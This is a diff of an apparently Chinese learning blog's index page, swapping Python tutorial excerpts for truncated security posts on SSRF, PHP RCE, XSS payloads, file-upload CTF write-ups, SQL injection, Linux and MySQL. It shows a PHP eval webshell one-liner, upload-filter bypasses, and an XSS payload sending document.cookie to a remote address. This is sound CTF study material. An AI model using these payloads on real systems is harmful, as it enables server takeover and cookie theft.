@@ -204,7 +204,7 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">26</div>
+    <div class="sidebar-state-number">38</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
@@ -212,7 +212,7 @@
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">16</div>
+    <div class="sidebar-state-number">18</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -272,26 +272,40 @@
     <div class="post-wrapper">
   <div class="post-wrap-left" data-aos="fade-up">
     
-      <a class="post-link" href="/2024/12/28/python%E4%B9%8B%E5%B0%81%E8%A3%85%E3%80%81%E7%BB%A7%E6%89%BF%E4%B8%8E%E5%A4%9A%E6%80%81/" aria-label="python之封装、继承与多态"></a>
+      <a class="post-link" href="/2025/02/14/ssrf/" aria-label="Ssrf"></a>
     
     
     <div class="post-cover-left">
       
-        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="python之封装、继承与多态" class="lazyload">
+        
+        
+          <img data-src="../images/126839103p0master1200.jpg" data-sizes="auto" alt="Ssrf" class="lazyload">
+        
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2024-12-28</span>
-        <span><span class="icon-pencil"></span>468 字</span>
-        <span><span class="icon-clock"></span>2 分钟</span>
+        <span><span class="icon-calendar"></span>2025-02-14</span>
+        <span><span class="icon-pencil"></span>4.7k 字</span>
+        <span><span class="icon-clock"></span>20 分钟</span>
       </div>
-      <h2 class="post-title">python之封装、继承与多态</h2>
+      <h2 class="post-title">Ssrf</h2>
       <article class="post-article">
         
-          封装就是private(私有的)
-关键词:____(双下划线)
-1234567891011121314class phone:    __v=2    def __keep(self):        print(&amp;quot;让cpu以单核模式运行&amp;quot;)    def keep(self):        if(self.__v&amp;gt;=1):            print(&amp;quot;good&amp;quot;)        else :            print(&amp;quot;bad&amp;quot;)ph=phone()# 私有成员无法被类对象直接使用，但是可以被其他的成员使用#
+           简介
+SSRF (Server-Side Request Forgery,服务器端请求伪造)是一种由攻击者构造请求，由服务端发起请求的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统(正因为请求是由服务端发起的，所以服务端能请求到与自身相连而与外网隔离的内部系统)。
+即利用服务器的权限去请求一些其他的非法内容
+借鉴：
+SSRF全详解-CSDN博客
+ 危害
+能扫描内部网络，获取端口，服务信息。
+攻击运行在内网或本地的应用程序。
+对内网web进行指纹识别
+对内部主机和端口发送请求包进行攻击
+file协议读取本地文件
+ 相关函数
+ file_get_contents()
+可以读取本
         
       </article>
     </div>
@@ -301,41 +315,48 @@
     <div class="post-wrapper">
   <div class="post-wrap-right" data-aos="fade-up">
     
-      <a class="post-link" href="/2024/12/28/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" aria-label="正则表达式"></a>
+      <a class="post-link" href="/2025/02/12/RCE/" aria-label="RCE"></a>
     
     
     <div class="post-cover-right">
       
-        <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="正则表达式" class="lazyload">
+        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="RCE" class="lazyload">
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2024-12-28</span>
-        <span><span class="icon-pencil"></span>1.7k 字</span>
-        <span><span class="icon-clock"></span>7 分钟</span>
+        <span><span class="icon-calendar"></span>2025-02-12</span>
+        <span><span class="icon-pencil"></span>984 字</span>
+        <span><span class="icon-clock"></span>4 分钟</span>
       </div>
-      <h2 class="post-title">正则表达式</h2>
+      <h2 class="post-title">RCE</h2>
       <article class="post-article">
         
-          正则表达式(regular expression)描述了一种字符串匹配的模式（pattern），可以用来检查一个串是否含有某种子串、将匹配的子串替换或者从某个串中取出符合某个条件的子串等。
-行定位符行定位符用于规定匹配模式只能出现在行的开头或者结尾，“^”表示行的开始，”$”表示行的结尾
-例如：^tm  和 tm$
-元字符除了”^”和”$”，还有很多常用的元字符，例如\bmr\w*\b,两个\b表示匹配单词，*表示匹配0次或多次，\w表示匹配字母、数字、下划线或汉字，该正则表达式就表示匹配以字母”mr”开头的单词
+           代码执行函数
+ (1) eval()
 
 
-
-元字符
-说明
+功能: 将字符串作为 PHP 代码执行。
 
 
-
-.
-匹配除换行符以外的任意字符
+风险: 如果用户输入直接传递给 eval()，攻击者可以执行任意代码。
 
 
-\w
-匹配字母、数
+示例:
+  12$code = $_GET[&amp;#x27;code&amp;#x27;]; // 用户输入eval($code); // 危险！用户可以注入恶意代码
+
+
+ (2) assert()
+
+
+功能: 用于调试断言，但如果传入字符串，会将其作为 PHP 代码执行。
+
+
+风险: 在 PHP 7.0 之前，assert() 可以执行代码。
+
+
+示例:
+  12$value = $_GET[&amp;#x27;value&amp;#x27;]; // 用
         
       </article>
     </div>
@@ -345,29 +366,33 @@
     <div class="post-wrapper">
   <div class="post-wrap-left" data-aos="fade-up">
     
-      <a class="post-link" href="/2024/12/27/python%E4%B9%8B%E5%AE%B9%E5%99%A8(%E5%85%83%E7%BB%84%E3%80%81%E9%9B%86%E5%90%88%E5%92%8C%E5%AD%97%E5%85%B8)/" aria-label="python之容器(元组、集合和字典)"></a>
+      <a class="post-link" href="/2025/02/03/XSS-payload%E6%9E%84%E9%80%A0/" aria-label="XSS-payload构造"></a>
     
     
     <div class="post-cover-left">
       
-        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="python之容器(元组、集合和字典)" class="lazyload">
+        <img data-src="/../images/17384736097c9d.jpg" data-sizes="auto" alt="XSS-payload构造" class="lazyload">
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2024-12-27</span>
-        <span><span class="icon-pencil"></span>1.4k 字</span>
-        <span><span class="icon-clock"></span>6 分钟</span>
+        <span><span class="icon-calendar"></span>2025-02-03</span>
+        <span><span class="icon-pencil"></span>3.1k 字</span>
+        <span><span class="icon-clock"></span>14 分钟</span>
       </div>
-      <h2 class="post-title">python之容器(元组、集合和字典)</h2>
+      <h2 class="post-title">XSS-payload构造</h2>
       <article class="post-article">
         
-          元组元组(tuple)与列表类似，但元组是不可变的，可简单将其看作是不可变的列表，元组常用于保存不可修改的内容
-元组的创建与访问（元组用圆括号）123456t=(1,2,3,4)#t=(1,)定义元组时，如果元组中只有一个数据，这个元素后面也要加逗号print(t[1])print(t[-2])#访问t的倒数第二个元素#嵌套元组t=((1,2,3),(4,5,6))
+          黑客是如何获取你账号密码的
 
-元组其实大部分内容都与列表类似
-本文只会谈及元组所拥有的特点与用法，与列表类似的部分会选择性跳过，不记得的可以访问我上一篇文章（字符串与列表）
-修改与删除(del)上文讲到了，元组是不可修改的，所以我们只能采用重新赋值的方式操作
+ 漏洞利用：
+1.盗取cookie：
+&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;
+2.构造页面跳转：
+&amp;lt;script&amp;gt;location=&#39;https://www.hacker.com&#39;&amp;lt;/script&amp;gt;
+3.构造获取cookie并发送到远程主机：
+1&amp;lt;script&amp;gt;document.location=&amp;#x27;http://127.0.0.1/test/cookie.phpcookie=&amp;#x27;+document.cookie&amp;lt;/script&amp;gt;
+ 常见
         
       </article>
     </div>
@@ -377,32 +402,32 @@
     <div class="post-wrapper">
   <div class="post-wrap-right" data-aos="fade-up">
     
-      <a class="post-link" href="/2024/12/27/python%E4%B9%8B%E5%AE%B9%E5%99%A8(%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%8E%E5%88%97%E8%A1%A8)/" aria-label="python之容器（字符串与列表）"></a>
+      <a class="post-link" href="/2025/02/01/%E5%91%BD%E4%BB%A4%E5%9F%BA%E7%A1%80/" aria-label="Linux基础操作"></a>
     
     
     <div class="post-cover-right">
       
-        <img data-src="/../images/17369576223624.jpg" data-sizes="auto" alt="python之容器（字符串与列表）" class="lazyload">
+        
+        
+          <img data-src="../images/126839103p0master1200.jpg" data-sizes="auto" alt="Linux基础操作" class="lazyload">
+        
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2024-12-27</span>
-        <span><span class="icon-pencil"></span>688 字</span>
-        <span><span class="icon-clock"></span>2 分钟</span>
+        <span><span class="icon-calendar"></span>2025-02-01</span>
+        <span><span class="icon-pencil"></span>5.3k 字</span>
+        <span><span class="icon-clock"></span>20 分钟</span>
       </div>
-      <h2 class="post-title">python之容器（字符串与列表）</h2>
+      <h2 class="post-title">Linux基础操作</h2>
       <article class="post-article">
         
-          字符串字符串访问首先我们定义一个字符串
-1s=&amp;quot;python&amp;quot;
+          
+linux主要特征 ：一切皆文件（目录、硬盘等都是文件）；硬件都在/dev 目录，如硬盘、U盘为/dev/sd[a-d]； /dev/sr0（/dev/cdrom）是光驱的设备名（df命令查看），为设备文件，代表的是光驱本身，得把这个设备挂载到目录下（一般为/mnt）(文件系统的临时挂载点)，才能对设备上的文件进行读写等操作；
+不懂的命令 ：man 命令（查用法、全称），只记得关键词，可用man -k 关键词；
 
-访问方式有多种，我们来看最常规的几种
-12345678#访问字符串中的单个字符print(s[i])#访问字符串中的字串print(s[i:j])#从s[i]到s[j-1]print(s[:j])#从s[0]到s[j-1]print(s[i:])#从s[i]到字符串末尾print(s[i:j:z])#从s[i]到s[j-1]以z步长截取#上述方法也叫切片
-
-单个字符编码python使用ord()函数返回单个字符的编码，chr()函数把编码转成相应字符
-下面我们来演示一下
-123s=&amp;#x27;A&amp;#x27;p
+ 系统操作：
+1234567891011示例：root@app00:~# root    //用户名，root为超级用户@       //分隔符app00   //主机名称~  
         
       </article>
     </div>
@@ -412,36 +437,41 @@
     <div class="post-wrapper">
   <div class="post-wrap-left" data-aos="fade-up">
     
-      <a class="post-link" href="/2024/12/26/python%E4%B9%8B%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/" aria-label="python之魔术方法"></a>
+      <a class="post-link" href="/2025/01/25/ISCC2016%20Easy%20Gallery/" aria-label="ISCC2016 Easy Gallery"></a>
     
     
     <div class="post-cover-left">
       
-        <img data-src="/../images/126839103p0master1200.jpg" data-sizes="auto" alt="python之魔术方法" class="lazyload">
+        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="ISCC2016 Easy Gallery" class="lazyload">
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2024-12-26</span>
-        <span><span class="icon-pencil"></span>401 字</span>
+        <span><span class="icon-calendar"></span>2025-01-25</span>
+        <span><span class="icon-pencil"></span>244 字</span>
         <span><span class="icon-clock"></span>1 分钟</span>
       </div>
-      <h2 class="post-title">python之魔术方法</h2>
+      <h2 class="post-title">ISCC2016 Easy Gallery</h2>
       <article class="post-article">
         
-          init()构造方法关键词：
-1__init__
+          题目链接：Navbar Template for Bootstrap
+进入题目，先上传一个webshell试试
+&amp;lt;?php @eval($_POST[&#39;mima&#39;])?&amp;gt;
 
-作用：可以直接在创建对象时对类中属性赋值
-示例：
-12345678class a:    name=None#类中定义可不写    age=None    def __init__(self,name,age):        self.name=name        self.age=agex=a(&amp;quot;小米&amp;quot;,18)
+但无论怎么尝试都会回显只能上传jpg和gif图片
+我们猜测只能上传图片马
+先制作一个gif图片马,上传
 
-str()字符串方法关键字：
-1__str__
+上传成功了，告诉了我们图片id
+那接下来呢？
 
-此方法是当打印对象或者使用str()转换对象时被调用
-话不多说，上代码：
-12345678class person:    def __init__(se
+view了也只是给我们看看奶龙动图，我们去网页源码找答案
+
+当我们在view页面点击submit时，给我们显示了一行路径，不用想，这就是我们上传之后文件所处路径
+这直接考到了我们文件包含的知识
+
+而数据又是以GET传参的，直接输入
+http://web.jar
         
       </article>
     </div>
@@ -451,30 +481,197 @@ str()字符串方法关键字：
     <div class="post-wrapper">
   <div class="post-wrap-right" data-aos="fade-up">
     
-      <a class="post-link" href="/2024/12/25/python%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/" aria-label="python之面向对象"></a>
+      <a class="post-link" href="/2025/01/23/buuctf-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-Upload/" aria-label="buuctf[极客大挑战]Upload"></a>
     
     
     <div class="post-cover-right">
       
-        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="python之面向对象" class="lazyload">
+        <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="buuctf[极客大挑战]Upload" class="lazyload">
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2024-12-25</span>
-        <span><span class="icon-pencil"></span>246 字</span>
+        <span><span class="icon-calendar"></span>2025-01-23</span>
+        <span><span class="icon-pencil"></span>444 字</span>
         <span><span class="icon-clock"></span>1 分钟</span>
       </div>
-      <h2 class="post-title">python之面向对象</h2>
+      <h2 class="post-title">buuctf[极客大挑战]Upload</h2>
       <article class="post-article">
         
-          类的定义12class classname:    //内容
+          这是一个文件上传漏洞
+
+一开始我是选择了&amp;lt;?php@eval(_POST[&#39;mima&#39;])?&amp;gt;的yijuhua.php文件进行上传，告诉我Not image(上传错误)
+将后缀改为jpg，改Content-Type: image/jpg，回显说存在&amp;lt;?
+我们将yijuhua.php内容改为没有&amp;lt;?的一句话木马&amp;lt;script language=&amp;quot;php&amp;quot;&amp;gt; @eval($_POST[&#39;mima&#39;]); &amp;lt;/script&amp;gt;，再次上传，还是上传失败
+我们将文件名修改为yijuhua.phtml，绕过常规php文件后缀检测
+将文件类型
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-left" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/01/20/upload/" aria-label="upload"></a>
+    
+    
+    <div class="post-cover-left">
+      
+        
+        
+          <img data-src="../images/124691006_p0_master1200.jpg" data-sizes="auto" alt="upload" class="lazyload">
+        
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-01-20</span>
+        <span><span class="icon-pencil"></span>4.3k 字</span>
+        <span><span class="icon-clock"></span>16 分钟</span>
+      </div>
+      <h2 class="post-title">upload</h2>
+      <article class="post-article">
+        
+          在看题解的途中看到很详细的题解：pass-18:
+[点此跳转]:Upload-Lab第18关：巧用条件竞争，轻松绕过上传限制！ | CN-SEC 中文网
+此大佬的其他题解也很好
+
+ Pass-01-前端JS绕过
+这是一个典型的前端绕过，因为它是通过js的弹窗显示的
+如图我们上传不了.php文件(一句话木马)
+
+法一：
+我们在上传php文件时bp抓包抓不到任何东西
+我们只需将构造的php文件（一句话木马)的后缀名改为.jpg|.png|.gif即可
+这样就能抓到包
+
+然后我们在抓到的数据包中将.png再改回.php再进行发送
 
 
-类的对象类对象支持两种操作：实例化和属性的引用
-简单来说就是调用类和访问类的属性和方法
-举个例子：
-12345678910class class1:   a=123   b=456    def hanshu(self):#类的方法后面会讲到        return &amp;quot;hello world&amp;quot;#创建一个对象，调用类x=class1()#访问类的属性和方法print(&amp;quot;class1类的属性a,b为：&amp;quot;,x.a,x.b)print(&amp;quot;class1类的方法输出结果为：&amp;quot;,
+我们能看到文件已经上传成功，打开之后也是显示php的后缀，这说明我
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-right" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/01/08/SQL%E6%B3%A8%E5%85%A5/" aria-label="SQL注入"></a>
+    
+    
+    <div class="post-cover-right">
+      
+        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="SQL注入" class="lazyload">
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-01-08</span>
+        <span><span class="icon-pencil"></span>4.2k 字</span>
+        <span><span class="icon-clock"></span>17 分钟</span>
+      </div>
+      <h2 class="post-title">SQL注入</h2>
+      <article class="post-article">
+        
+           SQL注入
+ 注入原理
+SQL注入是一种将SQL代码插入或添加到应用（用户）的输入参数中的攻击，之后再将这些参数传递给后台的sql服务器加以解析和执行。
+ 注入方法
+Sql注入的方式主要是直接将代码插入参数中，这些参数会被置入sql命令中加以执行。间接的攻击方式是将恶意代码插入字符串中，之后将这些字符串保存到数据库的数据表中或将其当成元数据。当将存储的字符串置入动态sql命令中时，恶意代码就将被执行。
+ 如何判断注入点？
+老办法：
+and 1=1 页面正常
+and 1=2 页面错误
+可能存在注入点
+新办法：
+select * from users where id=1daadda LIMIT
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-left" data-aos="fade-up">
+    
+      <a class="post-link" href="/2024/12/28/mysql/" aria-label="mysql"></a>
+    
+    
+    <div class="post-cover-left">
+      
+        <img data-src="/../images/124691006_p0_master1200.jpg" data-sizes="auto" alt="mysql" class="lazyload">
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2024-12-28</span>
+        <span><span class="icon-pencil"></span>6.2k 字</span>
+        <span><span class="icon-clock"></span>25 分钟</span>
+      </div>
+      <h2 class="post-title">mysql</h2>
+      <article class="post-article">
+        
+          [TOC]
+数据库（DB）：数据存储的仓库。 数据库管理系统
+（DBMS）：操纵和管理数据库的大型软件。
+SQL：操作关系型数据库的编程语言，是一套标准。
+打开Mysql: mysql -u root -p
+ SQL简述
+ SQL的概述
+Structure Query Language(结构化查询语言)简称SQL
+数据库管理系统可以通过SQL管理数据库；定义和操作数据，维护数据的完整性和安全性。
+mysql是一种关系型数据库，是建立在关系模型基础上，由多张相互连接的二维表（表格）组成的数据库
+对大小写不敏感
+mysql特点：
+
+
+使用表存储数据，格式统一，便于维护。
+
+
+使用SQL语言操作，标
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-right" data-aos="fade-up">
+    
+      <a class="post-link" href="/2024/12/28/python%E4%B9%8B%E5%BC%82%E5%B8%B8/" aria-label="python之异常"></a>
+    
+    
+    <div class="post-cover-right">
+      
+        <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="python之异常" class="lazyload">
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2024-12-28</span>
+        <span><span class="icon-pencil"></span>431 字</span>
+        <span><span class="icon-clock"></span>1 分钟</span>
+      </div>
+      <h2 class="post-title">python之异常</h2>
+      <article class="post-article">
+        
+           捕获常规异常
+语法：
+1234try：	可能发生错误的代码except:    如果发生错误执行的代码
+ 捕获指定异常
+语法:
+1234try:    可能发生异常的代码except 异常类型名 as 变量:    当捕获到该异常类型时，执行的代码
+ 捕获多个异常
+语法：
+1234try:    可能发生异常的代码except (异常类型1,类型2,...) as 变量:    如果捕获到该异常类型时,执行的代码
+ 捕获所有异常
+1234try:    可能发生异常的代码except Exception as 变量:    当捕获到该异常类型时，执行的代码
+例如
+12345678910111
         
       </article>
     </div>
@@ -485,7 +682,7 @@ str()字符串方法关键字：
 
   <nav id="page-nav" data-aos="fade-up">
     
-    <a class="extend prev" rel="prev" href="/page/2/">&laquo; 上一页</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span>
+    <a class="extend prev" rel="prev" href="/page/2/">&laquo; 上一页</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/4/">下一页 &raquo;</a>
   </nav>
 
 
@@ -514,10 +711,10 @@ str()字符串方法关键字：
     
       <div>
         <span class="icon-brush"></span>
-        52.5k
+        62.9k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        03:31
+        04:11
       </div>
     
     
@@ -553,7 +750,7 @@ str()字符串方法关键字：
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">26</div>
+    <div class="sidebar-state-number">38</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
@@ -561,7 +758,7 @@ str()字符串方法关键字：
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">16</div>
+    <div class="sidebar-state-number">18</div>
   </div>
 </div>
 <div class="sidebar-social">
